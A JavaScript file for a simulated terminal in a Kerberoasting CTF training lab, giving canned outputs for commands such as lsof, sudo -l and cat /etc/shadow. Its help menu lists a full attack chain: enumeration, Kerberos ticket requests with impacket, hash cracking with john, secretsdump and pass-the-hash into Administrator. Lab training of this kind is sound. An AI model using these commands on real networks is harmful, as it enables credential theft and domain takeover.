'use strict';

HANDLERS.push(
  // ── lsof ──────────────────────────────────────────────────────────────────
  {
    match: c => /^lsof(\s|$)/.test(c),
    lines: [
      { t: 'COMMAND     PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME', cls: 'b' },
      { t: () => `bash      ${process?.pid || 1234}   ${SIM.user}  cwd    DIR    8,1     4096  131073 ${SIM.cwd}` },
      { t: 'sshd         591   root    3u  IPv4  14231      0t0  TCP *:ssh (LISTEN)', cls: 'g' },
      { t: 'sshd         591   root    4u  IPv6  14233      0t0  TCP *:ssh (LISTEN)', cls: 'g' },
      { t: 'systemd-r    412  systemd-resolve   13u  IPv4  12891  0t0  UDP 127.0.0.53:domain', },
      { t: 'NetworkMa    432   root    8u  IPv4  13201      0t0  TCP 10.10.10.5:51234->10.10.10.10:445 (ESTABLISHED)', cls: 'y' },
      { t: 'cupsd        798   root    7u  IPv4  15023      0t0  TCP 127.0.0.1:ipp (LISTEN)' },
      { t: 'python3     1145   ' + SIM.user + '    3u  IPv4  18923      0t0  TCP *:4444 (LISTEN)', cls: 'r' },
    ],
  },

  // ── crontab ───────────────────────────────────────────────────────────────
  {
    match: c => /^crontab(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd.includes('-l')) {
        if (isRoot()) return [
          '# root crontab',
          '*/5 * * * * /usr/local/bin/backup.sh',
          '0 2 * * * /usr/bin/find /tmp -mtime +7 -delete',
          '0 0 * * 0 /usr/sbin/logrotate /etc/logrotate.conf',
        ].join('\n');
        return [
          '# ' + SIM.user + ' crontab',
          'no crontab for ' + SIM.user,
        ].join('\n');
      }
      return 'crontab: usage error: unrecognized option';
    }}],
  },

  // ── sudo -l ───────────────────────────────────────────────────────────────
  {
    match: c => /^sudo\s+-l/.test(c),
    lines: [{ t: () => {
      if (isRoot()) return 'User root may run the following commands on rembrandt:\n    (ALL : ALL) ALL';
      return [
        'Matching Defaults entries for ' + SIM.user + ' on rembrandt:',
        '    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
        '',
        'User ' + SIM.user + ' may run the following commands on rembrandt:',
        '    (ALL : ALL) ALL',
      ].join('\n');
    }, cls: 'y' }],
  },

  // ── cat /etc/passwd ───────────────────────────────────────────────────────
  {
    match: c => c === 'cat /etc/passwd',
    lines: [
      { t: 'root:x:0:0:root:/root:/bin/bash', cls: 'r' },
      { t: 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', cls: 'd' },
      { t: 'bin:x:2:2:bin:/bin:/usr/sbin/nologin', cls: 'd' },
      { t: 'sys:x:3:3:sys:/dev:/usr/sbin/nologin', cls: 'd' },
      { t: 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', cls: 'd' },
      { t: 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin', cls: 'd' },
      { t: 'systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin', cls: 'd' },
      { t: 'systemd-resolve:x:997:997:systemd Resolver:/:/usr/sbin/nologin', cls: 'd' },
      { t: 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin', cls: 'd' },
      { t: () => SIM.user + ':x:1000:1000:,,,:/home/' + SIM.user + ':/bin/bash', cls: 'g' },
    ],
  },

  // ── cat /etc/shadow ───────────────────────────────────────────────────────
  {
    match: c => c === 'cat /etc/shadow',
    requireRoot: true,
    lines: [
      { t: 'root:$6$rounds=656000$aBcDeFgHiJkLmNoP$hashedpassword1234567890abcdefghijklmnopqrstuvwxyz0123456789ABCDEF:19737:0:99999:7:::', cls: 'r' },
      { t: 'daemon:*:19737:0:99999:7:::', cls: 'd' },
      { t: 'nobody:*:19737:0:99999:7:::', cls: 'd' },
      { t: () => SIM.user + ':$6$rounds=656000$xYzAbCdEfGhIjKlM$anotherhash0987654321zyxwvutsrqponmlkjihgfedcba9876543210ZYXWVUT:19737:0:99999:7:::', cls: 'y' },
    ],
  },

  // ── cat /etc/hosts ────────────────────────────────────────────────────────
  {
    match: c => c === 'cat /etc/hosts',
    lines: [
      { t: '127.0.0.1       localhost' },
      { t: '127.0.1.1       rembrandt' },
      { t: '::1             localhost ip6-localhost ip6-loopback' },
      { t: '' },
      { t: '# Lab network', cls: 'd' },
      { t: '10.10.10.1      gateway.corp.local', cls: 'b' },
      { t: '10.10.10.5      rembrandt.corp.local', cls: 'g' },
      { t: '10.10.10.10     dc01.corp.local CORP.LOCAL', cls: 'y' },
      { t: '10.10.10.20     srv01.corp.local', cls: 'b' },
      { t: '10.10.10.50     legacy01.corp.local', cls: 'r' },
    ],
  },

  // ── cat /etc/os-release ───────────────────────────────────────────────────
  {
    match: c => c === 'cat /etc/os-release',
    lines: [
      { t: 'PRETTY_NAME="Rembrandt GNU/Linux Rolling"', cls: 'g' },
      { t: 'NAME="Rembrandt GNU/Linux"' },
      { t: 'VERSION_ID="2024.1"' },
      { t: 'VERSION="2024.1"' },
      { t: 'VERSION_CODENAME=rembrandt-rolling' },
      { t: 'ID=rembrandt' },
      { t: 'ID_LIKE=debian' },
      { t: 'HOME_URL="https://www.rembrandt.org/"' },
      { t: 'SUPPORT_URL="https://forums.rembrandt.org/"' },
      { t: 'BUG_REPORT_URL="https://bugs.rembrandt.org/"' },
    ],
  },

  // ── Help / misc ───────────────────────────────────────────────────────────
  {
    match: c => c === 'help' || c === 'help --ctf',
    lines: [
      { t: '┌─────────────────────────────────────────────────────┐', cls: 'p' },
      { t: '│         Kerberoasting CTF Lab — Quick Reference       │', cls: 'p' },
      { t: '└─────────────────────────────────────────────────────┘', cls: 'p' },
      { t: '' },
      { t: 'STEP 1  sudo nmap -sn 10.10.10.0/24', cls: 'c' },
      { t: 'STEP 2  sudo nmap -sV -sC 10.10.10.10', cls: 'c' },
      { t: 'STEP 3  enum4linux -a 10.10.10.10', cls: 'c' },
      { t: 'STEP 4  cat /home/<user>/notes.txt', cls: 'c' },
      { t: '        crackmapexec smb 10.10.10.10 -u john.doe -p \'Password1!\'', cls: 'c' },
      { t: 'STEP 5  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10', cls: 'c' },
      { t: 'STEP 6  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast', cls: 'c' },
      { t: 'STEP 7  john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'c' },
      { t: '        john hashes.kerberoast --show', cls: 'c' },
      { t: 'STEP 8  crackmapexec smb 10.10.10.10 -u svc_backup -p \'Backup2023!\'', cls: 'c' },
      { t: 'STEP 9  impacket-secretsdump CORP.LOCAL/svc_backup:\'Backup2023!\'@10.10.10.10', cls: 'c' },
      { t: 'STEP 10 crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889', cls: 'c' },
      { t: '        impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10', cls: 'c' },
      { t: '' },
      { t: 'Type  help  again to see this menu. See WALKTHROUGH.md for full explanations.', cls: 'd' },
    ],
  },

);
